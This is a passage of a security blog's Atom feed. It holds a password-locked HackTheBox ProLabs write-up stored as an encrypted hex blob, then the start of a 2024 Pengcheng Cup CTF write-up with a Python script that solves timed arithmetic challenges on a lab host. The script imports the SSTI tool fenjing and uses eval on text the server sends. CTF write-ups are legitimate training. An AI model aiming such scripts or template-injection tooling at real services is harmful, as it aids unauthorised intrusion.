5f21834c30b2132ef05176321d0e4bf52affb0bcb92aafd93184fe70151ffb2309800a375eafd4d992c1d29654dbfaafc41a21d2e04c2c554e0a187fdcf51d1c04b4c7a4de542e9743f67865bd8b57328e1782fde8fcbbb912aab8bd33ad886c47b590ac105993eb1fc79a62b78f26b8929b9b2e1c0fe3bc09e7904e1a67adfdf9148e282b4923a75ffe4092e201e41ec86fe59ad13456898c453e2474948a9f349f9853ee18db3632b73a090fb22cf4c8dc0e1067604e9b66e481ab3818fb3d0c50b1135934ecbd98655386b881d464bccfc4aa123dd4146e2fb61dad26f63e8a3e69231df7951bbca3fba15215c2a5180d16cab5fa127becd0c1dae370f171c9dd2fd0475f115907852006fef0368761e15bcb3e9a2d8384c51834331a8369198881e5d6285599f55a1f730a3982ca5ed2a67025a9e114311b63c295a0d6d2eaadde5cd60e64fdd0795a5e987e41f51d4f3bc1b9cf241e18d0d78ebf9c3ca9c3199376e1b794a657a603cc36f549ca8d0aeef1b144eb7f542aa6b303b395b73465b0eb1a8a3ed2d90237727e88d669ff6700d74e74f4b6fb3528c56c9fc6f0bae6ae18dbfe18189b28cde49b7214b7b16fb8a74811752f0c636243bc684164af5de244013076ef8a949a4984efe5a1f9990d853746fb22d960c13c8968811cb36c5a2ac46e87be65ad64e944892cab1a2240805b7d9e2284f7c7e0834d325b7de8579333c915996348409762392ec57a0cf84011689ea443bf61c215bc73072df3e9387c080ad3235c183a8cac1b55b9541d6ef490424193a6b5ff00bc2f043e5db860f619cefa1644bc54e95256153537e74e24f920c3d0c441a0c543b29bd4137f60ba324fddf5f5d4badd23f281ac051713580c88f16d6bd2aff8b45da2bf72e39a76780641431022441e961e90c4436cfb754a86842cdedc729cc4b6783c8648999f1e1dd2655906be68f7c862781ae54f0d48b949c1b518e65bd48cfc4e864b6b7cc680782d2e2ad3aa4be40fc8d717a6c0db6442d135fcc388198f1cdad91869f14e64c5f4837fbae266c62cc018ef04a1053e69b8fc52d3cdd5a3893e6c3f9f4bd00390f03c3a7c38bef0b56a8645ebbc775a38be58f1429b75446c48a6a3da5368ae7135763806c58315298dd0c34981a5f1757a0979f509b2f7ab28ffef293a92a6daa27298a5c09dcd788ff96534a80b7b76c327f4d17cf24ca12844eea596ae75799013765b51d4f308e7e9329db6993cee09eda1c5fc296654a0d0027b00a8e466438baccc66d8a7253d49aa87cde745df2847800b29d8d62662e64489d495f54d3f23d73e2eea3a2277d40049140e9cf94393741ebf653b6d1ae0bbaa2fd4dcc4105de74e4570ea8efacd7d2fb0d48b1ad32c454ddaa99dfdf0d70de5a851012d66f58a067ac888247fd6c72ac2030670b62d9797d18fd56ee757bb6f96a33ef51f5c3d3cb1b11fcdb6e2c4ce1b9d0585b1f33723823a161d966f1165a6278bd87a070db86a84015d548741abcb9e97bb96e383771324d970c92389196e8c5901acb23c55d31e1051e091bb879ebd6b74bc2685761c13e8b22eb51eab01486ac4621e87b3ee8f2f8466e2b3caa65a58f0d2b9a031ea460a4d035d327347a341d73222316d6f5d5a22863b679df14167579b68a7347e9beed3bb9d566057fbb18bbcf35cc57ffaa7c9f7c0c10cb2b59ae88a2b7490552c32ba14d1847d339fdeb2cd448007c9491434134820175e8cbc4dbc599ca2590a58e11b6fc93aa3ddeee13d4ce41573175cc02fa8ecf55ba8f4dd38221cd6f324f0574f1e11f35bb10e03ca224274187b53f05401d04622067afbf0d3b8a6396bf64bcee6d21b14f73da25cefacbcf9089356a74bff43a98fd2d7f6ab59cf09f9dda2b911a7af138df08eb58eb240a06d95b034a952707759ce363a1ec6af168d347d41eae26910da280a887e96dd58f97987297a4fc08865bb628c0100bea624099ecbf407f570b95dd8054eada69a64bc76fae982a6030b3091a2884ca639018badb318fdf3c6207c121044714cada7115728a1a2dda5386f801a9a112fdfd30e2ade4c00680eb0c8fc394ac58a43018ae4f2c1b5b28f03ebd5e72130e21a1e8de27ccaccf5aee1d8c1a3866eb14202e43790dd2c59b7b24c537675c9e07894c1eaa6ae8db10aa9921ba9d1e21b3f6f134ceebe4361a9201eea6b6665bc35953e03a573a3fdf1173772cf5308cdcb38a11442901ca337e3a15444ee034e95228177e653015f9e40c7f064cfcae7f706f3301c91d778bd330f3f33af2eec8734f1b5a395f16f688948617992974c7157506646e72cd2b7fa1f3a5af2091631271df3dd9de7cad65e311569e5b7bcc0e2e1d370aafe1c2467dc1403e0c34e5f2de757ab1703cf2c3d3354b290106f65a7b6f65052ebef42c4f3c1f47b2f0b35d7be3c0f06cccad98bcaf0aac34beef8e363154112dfe2c7bf4ba249385a14d90b88eec3c1b3ef651a3420dd23367d74fe159a46c663bfe9f19ab3c569ee3c6719fec23f66424a891adfd233cfcb819733cfd812fc76ed10480d6f77813fbf12dfe3797a92e957050e8e70d926e80337bad27a6615d31150cbcaff71759916edb434a3a8d98909278f42d74d3fe2a095d9d1906c7e38ea0fe47ce5c5690a69ac210ff7368af39cfc04fe14e00a55a6b5d9b8bcf8ae13bc129579351b2e1e96fed9bd22f4e8e107b434aa406215f022f5f23c89779765de965bf06062a2d1daf99ab1e1a10c50079a66f99bfcf57a39aea9cafa15fedf36a6ab22473f8133d19dc4ce8ed958d3e3dc08ea863884c6918eec7ca546bce4f21bcfd47d9c56b6d033153b41ac92a409a5a59464495a8e97bb8b06622f3ed09ded9f5a5fbe0c7cb92a71bf353cfe2efd8d971ee0870581abc75dcdeccd8edf68a5a1b15ac9fcd134add3a1711847b67f1f724a12b7eec72d9d108c616ae3e37e658f0bfe801e8c4b74ef38d7f315ec67f73322fec845686f3121c2b094280a84283487109b087b9926096d7c876066cf7d65474c15ae1f94042de2cd446c529e62fba00cf9fe52ae124c72f95838d8cca77672d259dcb361056094f9c56085462f63a093c8ed65fe0ef2b2eecf3dce5ca652a1c370b9fdb3b565b3fcd4287899c3abd509acfc1ca72280a1670540348f5d390f4b3d583fd5af292d992155deb13f156406e19d10ee7350e439cf96a49f95d3c50ea7eb03015ae765dc719167443fb62181efde723478b79604ab3831101bed666fdfe40e712fc677cdd94bdc9e22c66d147399c482fb297e1395a347c2bb73e24744b3c17440c520de7e8ed37b59c341d3574ee4debb9c7f22b1926358bc54bc7c4a4e5a81d2911f431b25835fd431598c63863ade7664ad132375291e8009eee825cf414ee6c8062114232c7dd87c79f916616449a10c50ab3ba9179d98938823a6f1d7ce3e8d0bcd38a743f302ce4d65ede67acc85e2659f74b5e2aea764662bc98c303bf071a350fabaa275e6b7c74799a711173072582e6edf0602e7a691a1503815c907666acba2b069a3dea87229c9dd0402e02e37d3e569b3505baa92b2a35e44f5017df9712d7e19ebddfc62549b1618da7d2a6dba7dc1f3ead6b12b995ae7874ff3d8758dbeaeef1702a2ec9e73f7adebcb0870818893bb8ed1f8e3dcbe675e494f766d04997832c243b3586886064facb2c9d93f0685c6e7867fe88aa30ff86258e9a78eb4425fe4d5630e823ff79f6b429d086175a0f3480e70d74d6858de865914312ed1fed0cf5fd1ac09eb9c611a1e6f097e75f02daa4f6f9ae33cf917dd39c588962868f49a05c431c72ed93e63ef4e24107960b8cb99001c00ee631865ffc306a4bb85078b218abe601be18f0610a0b83e461233ef58578a3876ffb5eb80697693fe1da9e7ddc847b800855dd931eb2cd84214fbef5ae4ee0afec13751249ecd3abaf580eed3ffa47a221902eae77f94b3e067f67573bcecfc348c8c4c0aa904e2f6cf8d70dfb3275ad9918d11f71db480898e0e0e59aef4ef46e3d34384f7df99d6544b92842fd14dce84a26c6a8dbb7d28f274fb3a84a7406e9ea7f83cb65825c232c09cf1aca78f588b87826e40cdce772314a03f3c749b73c63b38a6880ce3bba82608fd5c6bf2498dc303d4fd63b1beac06f6f39074d85546a1172d816d21e49a3421931d4e75cdc8b7e57853cf442703028ce93725672f11c6db841871cfd3fae59d90f453c39cb50302557a8ab0a6447bb9762eb61aecb330df3f9b1548c24657ef034773ebbfa34279af70932c056554f2dacee46fe55e25c64151955ac6d13eafb6c0e313aaca33c23ae3abec0d788396f42a086544452657ef93ed1a7bdc9d9aee45035b1f64514477bc3f8611b70f19970984e8a2142be7dddc8fb7f76a5c9aad161d2b9f46fba19b3a99ace8801044c4ff657cd956c64dfe5ef843472a6900f12affb63cc36a275fdef6feb6c8b9d7773c94b955f525331225c2335151cb6fd560eec1e173eaa3a83028c773c8b4a14f4c2a61e7e2cafc295e3a0e18132890ddf86240b72121b776c8ad33f8f3427b5c147a29c05382523cc8f616c9eb4b08b25d60bfc01580c26a3f59cf8383b3014b626c555d84490bbd798c2fb8faf19a997c98b0f8b2c6376eecddab3064784a2e213acb7cdfbc8880e1e5fc7051ef861604c238e28b508d70b173c51b908b1e06644884c807cf3ab6de6141156c76a09ff4769e1e2e375fe885ccc277d70a68d2baaeb64c8f644901086bbd7bc04e396323e4e614ca48dd69a7fb373105c52135208b91fd2fad095f83d1e42ac3ce6e2f413dae53be0f655f0c676ea8eeb43f49286f0a2e1fda1b1547ca62bfc1bbbad9581475b12b1729c7dec16eee9212fc6f00a116401828b41b84c3322050d5410d254d973e28d82dadecf31db7197468d51dda2b2908184498ca88a32a97eae3c5ebf63a5c2e48ea91412057cc53b0ff5779019613c1f744fdd03c214764819e3a9a231c5b6e4a66a668e86bb97b32725d525f57ffd2b128ee3bbc2a4a78b841d00052914060c246ebaa7ce5500883d1796e3a2b29cfe53bfa4d0f01b7b3e4d72539302ed4f9db8328e8ecfb31777c5ebc90d891ce36bbc6c3832d3a1553d34f4e7f032f25bd84ed50970c82b0950aa6d01f8b21c54d2c1a3a1afd1e4d9835718da90554615e3aa897ba969dc4baac086e1470297e3d026a75cff72699806ee3ca5e8dc0aabd8e683a30a264ec12ea34e14a6f65bc97f175b0beeb9ce1c801bf1b8af86dc4c7f4d025c2bbfd7dcea6c85619432ab076573c8dd568e86e8008ad4ef5e92e6bc3e42691a42a19a1539c481598ff0846e542c938b929f1e4de6712deecdc7609de748270a2c2a775a2a05ce7184498ba8118b2bf9df92234fdb6008923ff16d95519a52f20719072ebffa95125c4b345efb349c2d1af8d964733c3b01fc377a9193f7b4756a3575172c0f13061f241131d752fadd2e02746706822fcfd5740c92247c0e0145a4cf1d1a59b7e5c7edc2c47ab1bd1df112fe58bfd372833dee1ff15036d7ff77d023e17e3d04326487159dbee3293d1eba118956ab70dc839dc1e343bb6682420e24de20d05f8dc71f6dbb326d218a5287c13a45d4d09a7e814c6ee70dbe8d4f510550b9e0c05999b5f40cf771fbcfca74b8a613738d5aec362590c181a221779296c8affcb04f71349b024895128f9c9a7d3cce722a47a34431193e4f0a09cebfe33f42592ac66cbeea9332aef40ef4e02e59d450888a2bca8d3c85a17ce4f93857de4b6f92034d7dc57ba5387cb01c3379ddd74defe9f2b169d9d7ed88d9adeb4388f201152576ef63ea23fb7d46ffb2f1f1ac24d5bbae5a7887654440baf2b2c98b2b6f6d2ee34a37db04c369198356c3f2b06878d723883e53fae66241bb3927811c3db5642a45d39f9afe01982075f95e732f4c9477c8e3115dab6f4aeada95d036b266e9b966d7857f8e20213db277eef2a036f62227fd2df782aa6ad68705eee9fb4a7c3d4978a5a3b58320e61aecaa940eec062b1ebbd9c8470d258cbadf2b3976592113d8a9009e50f85d9c315d359774d859f7a7f168082e2ade7c6e0d468a17c3fba2a30c0e01698caa6ab249f5d817cd9d3f8c4cbf075ee52be4064d2389f267fc1ec0efde1882e6fc9c8e090b5acd8ffd5e79a8567a02f2b85bd946ad9e9835bfab671ac0916de2be7fb3635580ac70c7539e569fe2f4ede1fc9dd79ffb644f1c96578b245abd1dfd18329797c159882fa30d6829a476c6bfa5adac3597a0e945a2543bf222945a1ea43e6fbb7d5596458d5acf3fd7b4a57f564d7dbbb01ba58121b19bf57199c1030be2932a2d23f4224653fc99f2af97c8e8346fec8b1e80e2550ecec68b01a8107c99c662b0e75130433dccbd8a77ff22ffad8a50315e4bffbd736ec657c007b3b6facc1859ba620487249286b98744c5d27742f4ff0273b030d47f964259c9e88dd0c2ec21a54d58438b02fa51055aa84ba61742d2b4a6c1085b83934650d2d7817a533290a6221069ba6bd1d2819177d17e8ff57b1455a266d0ea587978a05e90aacb4f9a43db0d0360cd744f37871026849f919f66bb47430f35c7a8e73af8b435b3d5b3a72bb659f83df92f5498e5096cf60d20121ee8a18286592f991f3c5e3d266bbb35c4b85869d4653dc243afa2f0cd647d2741276bdd398155c1f787f3f497764193939154f9bfe11aec853dd3ff14b547477dcfc38e599f5b36b657438ad3c4bcd6e6471fbdadc096d294fb3d8abde0e3d5a49b8424602cc9c1beff65b6ad51490af67976d75e360189208a8ad045df32f9b94763d035451f658c49c2ca9d392a627515c16fdabff4984637ba0c6061a4e89d9214915cd832cd091fb750504d89477736c19f271b2ecb028f0e4b60bcb4037a9f425f376807d9546dad90a694c3bb323cd8a503c58e6358d69d91491545117bfd136a0e0ae985113c7e930eaf4fa6e88cb8b7f685238cf3cff2220498b8eab553d41ae397bf8230e683c1e0f2e869c9c050f864013ec922b5c1162a88acee0ad7558d2bb849bcbc8bd5643ecd47a3391e395c10d168455c855d34d707411bf983512f0868302b249db41ec73123795cef4b230e570c39969dcef628cfb9f7a1bf1af252ac919d339ab8687a40afcd2f9818ebb611c8589fab30b01f6856654b54c268d09cae09fb5fddc8a18cc8d16f252506ea955fca30ddc05483396e44b85b3548abcf3571a25907f73e592a3c87f73b51bcdd1f3411e26c7277982209e48d44a0d3f42cd8b8e9c76bb7eaf5a0cb587d64edfd4941ff5c4c9883afb0ab01dbc78ef259bf58eb5b2a1a3c2a0832b2cca3fb9bfa53958091194fde45da93f0e30dc608bcc92a5d38adc3cf24bab94bfbc11a95582ce2ceb3c05fcdc387f24a4f7a2b1c1e741491ee577be5c73fc28ba850a75315d00ff99335ccfebd8520f428029198429b23edf11ef6fd6577c36eb8790663e2a20047455cebe64917342858519ebbf18410174296cabb24292b259f5b06916a959151d313d80e175c0ec2b3a77cc959026d8f5d62f5012c5fb785ec1da99fbb0ef74e5aa1195b00fdb4cc728262476faaa9d21b5119f716569ae702e0938595cd9a948a2ec983f8bdafa29a32671f791014b09778dd3170f37bc7d4600735fbd38621775b5a23d175eeed6c460cfd262dfe8e163094b3162f01a8fdaa492faa497acf3860be6c94da36b455e526edc9dff574ef630d9b50ec3834f9e5753cde80c456e8d3ecda44c73236be54a30f2c9392c394171ac71bc22beb59790b0c550f37148e8332a62531268d72ac3067a6f84ee3a3a1f2961b4f153fa1323769a8312f37b907550dab65b32405eb909a288c75fe6c9fdd61d55595a6699eeb418b0a6c6eca8991ed6d7070e3730992a1aefd10f283ea1329d8fac62e2c2f357f0615c53ba923488586cfa2e1cd08136d0cf49ad42b2b4d9b41ba6eb402030e83b371f581c6fdd7da82c1370a99f87dcde0bffddb6cfd3e647c1fb98a913a6f8314962aab3b40204637b81c02633d21872b2b967e2419ced6b76b59eff045ff75b1545849b98891022fa9a87f65db38bcb0941ebde58f159745139839af855c5476c48103170b795550d9acc1174eca0dbfb9182ccd03b473e9d264da56f854e383fd6e81e1b26598905a1c591e5bb556896d5788e733aba1c6119d76cd53fb94b710232f16042046e5395ba629cedb7d68629fd70f877c9628b7a4568666e65a71396b268ca55d80573fc37a354835566a218624d78fcf22aba5b9c1a7a115e4ac367ddd5087dd7fae06e8f219c6a40c025fce308148fcff0c0b82fd6c450703195897c90df34261e7c327e5828f91e266fd9f567189b451a391b68d642eaf58e825e3ee3ddab9183b30b5cfa988bc8f348e1cdfb360d655d0b88750f4fc9f5c6c0d00f0a1d32c293dd394ece72bb564e58927408cc087b047f8066065588820066c6e6b73a23a51d88891133d7c0b6b3783a2e85f07f20b1fdb577b3b67155c540f6a725e54d6031478a5129dcad4668cedd1fc748171d16f7cb72db94f82873cf12c1aa5f00de2316cbb3a208413b4e0addea47333d147f702c8735d8fa05209d028a1197fcc5f6547c161048b5b1a9c1491208bfcb863cc72fb67479bc9152a898913da3cad845d31b3b79d064a68da1fb70095915caea5478c617991509e526b9c774c24f5a6bb26819a0bdf03cd5fbac0430c35c3757a3560b0583704f8576bb57e984767d0918452109ebacad629b7177f53586932530da0c42eb51834b1636cb0cc758331f405fa17497aed68d6b1723c8f63a1be9a6b654a7ec2e0385187b2ac3bf77f5c5505d6c7eb0b98414cc663847dcb0163f2ff545828ab1396831fcdc1f765f758bea4b579d90b6a503f14b0d5a1c4353a89201220165ae94cefa5049ba0bca64b7a3fa1513d270ecc0b79fea2ec688594053243d79995fe046c03a416b99d98e35bcbeb2bdbc12e7513088d0c9937df4a5c821e43811a3a0d55d2b9f757df4713dc8d9a22d1d91d8641229a01ca6d5f969b4263794b38dc5f3fdb65bd68cf8d0cd852d5a8eb79cecac148ce11b61c87b514966141065b5f0d594879bfbdad51e78a9b76dce46c08374e3d2700215ffbfd661052ed224247eda27c0bb482575b6deb9f75a76a2ba7dfd18a7f7840302ea7586d0d0d8ca67bfafd3dc95b40f17eb418c1a34c7a2e02dc327ec5d28c3820acd70b33fe920717979d47451e10a250d564a57a02016ab1195816b71ded3ac160f4a003f40b4c3926a5262727c1e158cff917603065bfad2a981ab045759711432aaa60683566d936a0bdb295faed8925f25c9957cfdef62e059cb3708205a539473809fff2c8c730dc5e6f668f13f86cc73990748fa6226f35d395ac47b72262d9f36e159058cf2468d9e34cb095381a22b81b6f5cc3eb5c8ca5c72eaba1d2b3cab16fae11f987969d358c2cfeecd6f9bd063853bf9a1ff9b4bf9f31ef717a7aba4dee96c7b13c919a60ea336392a177067866c98fec6818d3e9bfb1d55af3cc7098973b333312bbca75d1e8fc3c0b1b3cd68bdcc71b1882c05008eb3e3c4b0e3521fa7120524083575f6903287fbc5d71c527672a7afc285aaee73487d002d58d9567c53247fc09c7158ce22febfc572f9b19e1379d4884a7ff826ea93f2cbe170ddf4259a5ff502c29469e08253ef1686e207bc3a6acaa9388b0f4daf2b9fd1f9189919b272333c67dfe9a0742b1c724a6df03a94dc43d04bb13878f6770a306e2c8f6f15718225f656698f3f8d01ae95a2a600e9eaf4f2f15c49855e79952ccb12398acbfd6f4c3944557ea24af61022b5f1be0fcfbe61006a4110cff7e2d665b981cff0976dee32fbc8bd72751a9a861b1936b499156236802c19fe272015155bb470e0ba2cdd017601b9f329b6aaf8f402dca9f34e21fb25aff3afa7b7e9f910e71c219ba61c3b9924f3f24417ba1e90ba14d6c58e186912b3390f9aef07226e58ac7a6e79f793725082e120ecf51fb28ce0a897ba337527ad71d78058b09e45fdf31aaacc37f85123d4a3e01cd824c85bbe6557b13ab54682bb471375324ab292cc860cbdca880b2f5fcdab3485d75452a088dc3141f494f4485010ffad569722443c298bd423189735fc118271b76fd825cf84e1705cdc5f962c3707ce1fd33914191bba64e460735663af4f4251608f615611f0cea435a7dd963b8aef77fc4ae70a41d1fe069068a2cc98f4dc757dc0d706202b2c4b3898d1e7893b0efea44663799f3c666ab0ceebdf5d831b095cd72d9fe29ab4fde833fdc6b0990daca1c9494a7392a3ba9588d708c38638c726bd9c02b0677a5e400316ec4a1aa2c5e2329f531bab31504cb1fa2c3ad87a0893219703a8f50aba2e42cca45451b1d29ffdb4f0e711f9aef4e3bbfcb3cc30000238a87664f225d3e759ddb0a064e045bc7df560fc07a592639517f7a65f99f22ae834f593bef77d4826cfb7ecbe71d3d5ba40104ad5eb13c53628d7e65e4ad1b8f50d2f401a51a616365cad102ed5df0f6aba9ed07583c0990b24d7b2382f184cd93ed854d40acf6563f2799a99e7d54661c1f11398c69cc4cc490e64e17187f3944f5027434b674dcde66bad9c2bef3bd8a43cf42530054e03db0e1d872631f91fefcb5c75c06e3b4a8dc7da1619c133a0e3563f165068581638531110ab1591b0d8f201a148e584059b147f9a7005158c937e30bb42e5340d206ce249f673de4f4e319e9a9d95c8b181df6548814af0af8ee57b115bed20412ad99a0141542c44ca375e8db8d53d55779cbd32b745ec289549d45c4bf7bd39d1a2e4d036f8fc11e90a7c38a7b6b5059c3de5071c125d35bd51836ca2b106e7ea5ca2611192054f5c6005f93fa73657e0f4d5823b1e0f5e245698673539dd2e9496c28ab9624b99a510343f73b84f2cd98502dbb4778b33957919875078648e01eeb8d87d92465f5f6541958da57274ada5acbb31adab316cd56dab58c6dbfda51e62b82f6151306a61953fc3636475ba48334a92ea07c928b0201e60268aa1371f89049b20f5a3d5ddec7bc564a1e86dea682ae9183f1b08c7f4fa78a36f53efb60b5bacb7aa5f7b3f527f67b5695059d366a54759636627205be2b60421efdeb9b8327ac3c277dce77f32de032f6348be5381ba54d9f619f891f52ec28bd07e6a4eb2b5b079960f5a6b5628aae2ccc5812d8d730b832cd5202abf2cbdc4bde3d0fbc959b93f3228d5e3de0868ffabf8e131a29231325f651506b1f2e50a4417e033d80e60a716995aa06f06cc7730afb073cdc5b506c55c93d4854bc4d690d3aad149a62280e425cb51133e16bcba5e7263691c1068ca0e51bb0efe842f0d6235d3dfe1d27586e717c7a180a0f2db44a528dda3b241b99687e5c9033f20535ec5faa6ed103a34d4a24033cc5390b34114779cb80ed3c6d68b732b0b884dc3bcd4acee58c905554ab45b1ee7ee3c3ec757fa0af8b8b6041bd066e294c3fecf6210d40ecdf8fcbaf29b4383b23c8c624b5715bb4f9524259a3f028a71f019bf16ceec9963417caedc064e6d399a53b0d1a0fe46cf7ab14af67b0a99000ec84d904e187114ceb3bb8fa6798fe7fc12f7fd653c95e99010c2d87f597b7c99478ecb984e11bc2798497a7d2864f050c21a22759a2c009029d7286857f123d0054f9784729fa8a2dcc1594a7c67d9a52373f126ca410bbe4e465944a5cc4ee9fb1686b21a090640e77957009befbaa59f5db993eb6ad6542ac8dda2ea5112fbc1213eb2d9c2def41b25454e7809bbe0b7da940385113b8842f1194d5b43ede6259ee23e079388208c17c30a78d09a472584fe0adcd1200c074fe114dc9b535632a22c1bf0b861657a456f7396bd6ab0f5e2c0afe4fce24519deac4746a91dfe073480351e4c78afe293f8c94c9272208d4f83f4097d2072fde9f63e2bbb7e7647b94e8e66d78a158057b1c59595c4b7aa0581abe64854dba76958be63bccc67998756dd593e3dcfa0121eb9144ccf24562a7817a516091fe8ccc4da7b1878906249c179bf45440343e5c1cfcd4fcc800b33c706b4189e0df04d7c56e27ca587c296f4df4e39a976d09a7d4ce0b803ae08261fc3186d3f357832774c9994cef957fe9771d5c541f0cc414ebe5e2b5196bc469151dd47ffc32ce4868ec05a330ce34d5ab80cfdf2381653a25e1860a92e3b02bb0ac03a498f106041ba26ffb99da6818730a34d0a97e15f6700a9b40a5ca1f43d58a380e7c7d47fee8e201779a2172c3fe6af39054ee9be9a3c56afaa6290671b510fbe0bcd3df0f57b2e28d9f6fd5bf970f659ec53af376ef7dc9dc40b5e77541eec0c6d19f7fefec7582c473a033a4094ccbf458f18ebf2f40f72788e6db88df3d86cb5a80be78e603998ea54dc79fc056af6a35a77de1689cd555b47cacced9e4f2a2ec0ec2361a31121fead20819e453e2e5299932630d9283a5f7984e477e30eb2b065fc6943b4acbec92a04547faa9e0437ca12523b3e50b378673fb5cfa2ea2c198dc3196877245bc74db33767091c19066ea810350bfe242c9ad5be700e25e19ed42412a6ff4ce293</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">HackTheBox篇ProLabs系列之Zephyr</summary>
    
    
    
    <category term="HackTheBox" scheme="https://ya1orin.github.io/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://ya1orin.github.io/tags/HTB/"/>
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
    <category term="ProLabs" scheme="https://ya1orin.github.io/tags/ProLabs/"/>
    
  </entry>
  
  <entry>
    <title>鹏城杯 2024</title>
    <link href="https://ya1orin.github.io/posts/da65110a.html"/>
    <id>https://ya1orin.github.io/posts/da65110a.html</id>
    <published>2024-11-10T12:57:59.000Z</published>
    <updated>2024-11-11T00:55:57.684Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="python口算"><a href="#python口算" class="headerlink" title="python口算"></a>python口算</h2><p>访问题目看要求是要一秒答题，果断找gpt写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span 